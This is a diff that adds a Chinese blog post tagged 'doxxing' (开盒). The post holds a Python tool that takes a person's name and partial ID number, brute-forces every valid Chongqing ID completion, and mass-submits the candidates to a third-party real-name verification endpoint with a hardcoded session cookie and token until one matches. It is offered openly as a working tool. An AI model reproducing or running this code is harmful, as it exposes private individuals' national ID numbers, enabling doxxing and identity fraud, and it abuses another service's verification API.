@@ -1,0 +1,250 @@
+---
+title: 重庆市全区身份证补齐
+published: 2026-03-01
+pinned: true
+description: 支持补齐重庆所有的辖区
+tags: [开盒, python]
+category: 开盒
+licenseName: "Unlicensed"
+author: 枪宴
+sourceLink: "https://injt.top/重庆市全区补齐"
+draft: false
+date: 2025-01-20
+permalink: "encrypted-example"
+---
+<span style="color: blue;">import re
+import time
+import requests
+import itertools
+from tqdm import tqdm
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import sys
+
+# 重庆市各区身份证前6位代码映射（确保覆盖所有区）
+chongqing_districts = {
+    "500101": "万州区", "500114": "黔江区", "500102": "涪陵区",
+    "500103": "渝中区", "500104": "大渡口区", "500105": "江北区",
+    "500106": "沙坪坝区", "500107": "九龙坡区", "500108": "南岸区",
+    "500109": "北碚区", "500112": "渝北区", "500113": "巴南区",
+    "500115": "长寿区", "500116": "江津区", "500117": "合川区",
+    "500118": "永川区", "500119": "南川区", "500110": "綦江区",
+    "500111": "大足区", "500120": "璧山区", "500151": "铜梁区",
+    "500152": "潼南区", "500153": "荣昌区", "500234": "开州区",
+    "500228": "梁平区", "500232": "武隆区"
+}
+
+class IDValidator:
+    def __init__(self):
+        self.verified = False
+        self.verified_id = None
+
+    def verify_single(self, name, cardid):
+        if self.verified:
+            return None
+            
+        # 身份核验接口（实际使用时需替换为有效接口）
+        url = "https://admin.llcx.com/user/auth/renzheng.html"
+        headers = {
+            "Host": "admin.llcx.com",
+            "Connection": "keep-alive",
+            "Content-Length": "138",
+            "sec-ch-ua-platform": "Android",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 15; MAA-AN00 Build/HONORMAA-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.103 Mobile Safari/537.36 XWEB/1300409 MMWEBSDK/20240501 MMWEBID/3890 MicroMessenger/8.0.50.2701(0x2800323E) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 miniProgram/wx305f1562c03e5e0e",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "sec-ch-ua": "\"Chromium\";v=\"130\", \"Android WebView\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "sec-ch-ua-mobile": "?1",
+            "Origin": "https://admin.llcx.com",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://admin.llcx.com/user/auth/renzheng/token/8af6d21b7a041093cbcc02f8ddd40c6191aecfdc74898fc986507d811eab17f2",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Cookie": "PHPSESSID=ejbln8iov6s6fop110h3jn4f6v"
+        }
+
+        payload = {
+            "cardid": cardid,
+            "user_xingming": name,
+            "token": "8af6d21b7a041093cbcc02f8ddd40c6191aecfdc74898fc986507d811eab17f2"
+        }
+
+        try:
+            response = requests.post(url, headers=headers, data=payload, timeout=5)
+            response_data = response.json()
+            if response_data.get("result") == True:
+                self.verified = True
+                self.verified_id = cardid
+                return cardid
+        except:
+            pass
+        return None
+
+def address_lookup(card_address):
+    """只匹配重庆地区码，支持xxxx格式"""
+    x_count = card_address.lower().count('x')
+    normalized_address = card_address.lower().replace('x', r'\d')
+    pattern = re.compile(f'^{normalized_address}$')
+    
+    matched_areas = {}
+    for code, name in chongqing_districts.items():
+        if pattern.match(code):
+            matched_areas[code] = name
+    
+    print(f"重庆地区码需补齐 {x_count} 位，共匹配 {len(matched_areas)} 个辖区")
+    return matched_areas.keys()
+
+def check_id_data(n):
+    """验证出生日期有效性"""
+    if len(n) < 14:
+        return False
+    try:
+        year = int(n[6:10])
+        month = int(n[10:12])
+        day = int(n[12:14])
+    except ValueError:
+        return False
+    
+    # 合理年份范围（1900-当前年份）
+    current_year = time.localtime().tm_year
+    if year < 1900 or year > current_year:
+        return False
+    if month < 1 or month > 12:
+        return False
+    if day < 1 or day > 31:
+        return False
+    
+    # 月份天数校验
+    if month in {4, 6, 9, 11} and day > 30:
+        return False
+    if month == 2:
+        is_leap = (year % 4 == 0 and year % 100 != 0) or (year % 400 == 0)
+        if day > 29 or (not is_leap and day > 28):
+            return False
+    return True
+
+def check_id(n):
+    """验证身份证校验码"""
+    if len(n) != 18:
+        return False
+    weight = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
+    check_code = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
+    
+    try:
+        sum_val = sum(int(n[i]) * weight[i] for i in range(17))
+    except ValueError:
+        return False
+    
+    return check_code[sum_val % 11] == n[17]
+
+def main():
+    print("===== 重庆辖区身份证核验工具 =====")
+    print("东莞出品频道：@XNYXYNH520")
+    name = input('请输入姓名：').strip()
+    card = input('请输入身份证号（未知位用x代替，例如：500xxx20000101xxxx）：').strip().upper()
+    
+    # 统一处理为18位，不足补x，超出截断
+    if len(card) != 18:
+        print("提示：自动调整为18位格式")
+        card = card.ljust(18, 'X')[:18]
+    
+    # 提取地区码部分（前6位）
+    card_address = card[:6]
+    if 'X' in card_address:
+        address_list = address_lookup(card_address)
+    else:
+        # 验证是否为重庆地区码
+        if card_address in chongqing_districts:
+            address_list = [card_address]
+            print(f"所属辖区: {chongqing_districts[card_address]}")
+        else:
+            print("错误：输入的地区码不属于重庆市辖区")
+            return
+    
+    # 处理性别位（第17位）
+    card_sex = card[16]
+    gender_hint = ""
+    if card_sex != 'X':
+        gender = "女" if int(card_sex) % 2 == 0 else "男"
+        gender_hint = f"（根据第17位推测性别：{gender}）"
+    print(f"身份证结构分析{gender_hint}")
+    
+    # 构建未知位的可能数字列表
+    digits = []
+    for i in range(18):
+        if card[i] != 'X':
+            digits.append([card[i]])
+        else:
+            if i == 16:  # 性别位
+                gender_input = input("请确认性别（男/女/未知）：").strip()
+                if gender_input == '男':
+                    digits.append(['1', '3', '5', '7', '9'])  # 男性为奇数
+                elif gender_input == '女':
+                    digits.append(['0', '2', '4', '6', '8'])  # 女性为偶数
+                else:
+                    digits.append(['0','1','2','3','4','5','6','7','8','9'])
+            elif i == 17:  # 校验码
+                digits.append(['0','1','2','3','4','5','6','7','8','9','X'])
+            else:  # 其他未知位
+                digits.append(['0','1','2','3','4','5','6','7','8','9'])
+
+    # 生成所有可能的有效身份证号
+    valid_ids = set()
+    start_time = time.time()
+    
+    # 计算总可能组合数（用于进度条）
+    total = 1
+    for d in digits:
+        total *= len(d)
+    print(f"\n预计生成组合数：{total}，开始验证有效性...")
+
+    with tqdm(total=total, desc="生成进度") as pbar:
+        for candidate in itertools.product(*digits):
+            id_str = ''.join(candidate)
+            # 验证地区码、出生日期和校验码
+            if (id_str[:6] in address_list and 
+                check_id_data(id_str) and 
+                check_id(id_str)):
+                valid_ids.add(id_str)
+            pbar.update(1)
+    
+    end_time = time.time()
+    print(f"\n生成完成，共得到 {len(valid_ids)} 个符合规则的重庆辖区身份证号")
+    print(f"生成耗时: {end_time - start_time:.2f} 秒")
+
+    # 二要素核验
+    if valid_ids:
+        verify = input("是否进行姓名+身份证号核验？(y/n): ").strip().lower()
+        if verify == 'y':
+            validator = IDValidator()
+            print("\n开始核验（成功后自动终止）...")
+            
+            start_verify_time = time.time()
+            with ThreadPoolExecutor(max_workers=30) as executor:
+                futures = [executor.submit(validator.verify_single, name, id_num) for id_num in valid_ids]
+                
+                try:
+                    for future in as_completed(futures):
+                        result = future.result()
+                        if result:
+                            print(f"\n✅ 核验成功！")
+                            print(f"姓名: {name}")
+                            print(f"身份证号: {result}")
+                            print(f"所属辖区: {chongqing_districts.get(result[:6], '未知')}")
+                            print(f"核验耗时: {time.time() - start_verify_time:.2f}秒")
+                            executor.shutdown(wait=False)
+                            for f in futures:
+                                f.cancel()
+                            sys.exit(0)
+                except KeyboardInterrupt:
+                    executor.shutdown(wait=False)
+                    sys.exit(1)
+            
+            print("\n❌ 所有号码核验失败")
+    else:
+        print("未生成有效身份证号，请检查输入格式")
+
+if __name__ == "__main__":
+    main()</span>
